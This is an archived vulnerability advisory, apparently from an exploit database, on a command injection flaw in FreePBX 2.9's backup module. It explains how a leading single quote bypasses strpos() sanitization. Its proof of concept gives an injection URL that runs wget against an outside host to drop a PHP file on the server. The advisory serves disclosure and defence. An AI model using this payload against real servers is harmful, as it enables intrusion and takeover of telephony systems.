@@ -1,0 +1,74 @@
+id: 20699
+date: 04/28/2013
+title: FreePBX 2.9 Backup Module Remote Command Execution Vulnerability
+author: Ahmed Aboul-Ela
+cves: 
+
+# Title: FreePBX 2.9 Backup Module Remote Command Execution Vulnerability
+# Author: Ahmed Aboul-Ela
+# Contact: Ahmed.Aboul3la[at]gmail[dot]com
+# Vendor: http://www.freepbx.org
+# Software Link: http://mirror.freepbx.org/freepbx-2.9.0.tar.gz
+# Version: 2.9 and prior versions should be affected too
+# Tested on: Linux (Centos)
+
+- Introduction: 
+
+  FreePBX is an (graphical user interface) that controls and manages Asterisk, the world's most popular open source telephony engine software.
+  FreePBX has been developed and hardened by 	thousands of volunteers over tens of thousands man hours. 
+  FreePBX has been downloaded over 5,000,000 times and estimates over 500,000 active phone systems.
+
+- Vulnerability Explanation:
+
+  The vulnerability affects the "page.backup.php" file in the Backup Module of the FreePBX 2.9 which lead to a remote command execution
+  The affected $dir parameter is already sanitized and protected in the code but it suffers from  a weakness that can be used to bypass this sanitization
+  
+  The following if condition code is used to protect and sanitize the $dir variable in page.backup.php:
+
+	if (strstr($dir, '..') || strpos($dir, '\'') || strpos($dir, '"') || strpos($dir, '\'') || strpos($dir,'\`') ||
+	    strstr($file, '..') || strpos($file, '\'') || strpos($file, '"') || strpos($file, '\'') || strpos($file,'\`') ||
+	    strpos($id, '.') || strpos($id, '\'') || strpos($id, '"') || strpos($id, '\'') || strpos($id,'\`') ||
+	    strpos($filetype, '.') || strpos($filetype, '\'') || strpos($filetype, '"') || strpos($filetype, '\'') || strpos($filetype,'\`')) {
+		print "You're trying to use an invalid character. Please don't.\n";
+		exit;
+	}
+  
+  it should prevent the $dir variable from containing any single or double quotes by checking the presence of it using the strpos() function
+  but unfortunately there is a weakness in using strpos() that could be used to bypass the sanitization
+  
+  According to php.net strpos() manual the function should return an integer number which represent the position of the character in the string and it starts the count from 0
+  so the first position of a character in a string will be 0 and this is the trick which will be used to bypass the sanitization function 
+  
+  if the single quote is the first character in the $dir variable then the strpos function will return 0 number 
+  And if() statement doesn't check for the return type it only check for value so it will consider 0 returned from strpos() as a boolean value not an integer
+  the 0 for boolean means FALSE so the if condition will be False and it won't detect the single quote at the variable so it will bypass it :)
+  
+  
+- Vulnerable Code Snippet at /admin/modules/backup/page.backup.php
+
+  LINE 25: $action = isset($_REQUEST['action'])?$_REQUEST['action']:'';
+  LINE 29: $dir=isset($_REQUEST['dir'])?$_REQUEST['dir']:'';
+  LINE 35: // The Sanitization code as mentioned
+  LINE 44: switch ($action) { 
+  LINE 64: case "deletedataset":
+  LINE 65: exec("/bin/rm -rf '$dir'");
+
+- Proof of Concept:
+
+  > To Execute command: wget http://site.com/file.txt -O file.php
+ 
+    http://[ip]/freepbx/admin/modules/backup/page.backup.php?action=deletedataset&dir=';wget http://site.com/file.txt -O file.php; echo 'mission done
+
+  > The the evaluated command will be: 
+ 
+    /bin/rm -rf '';wget http://site.com/file.txt -O file.php; echo 'mission done'
+    
+- Fix / Solution:
+
+ you should upgrade to version 2.10  
+ 
+ - Credits: 
+
+  Ahmed Aboul-Ela - Information Security Consultant @ Starware Group
+
+#  0day.today [2023-03-26]  #
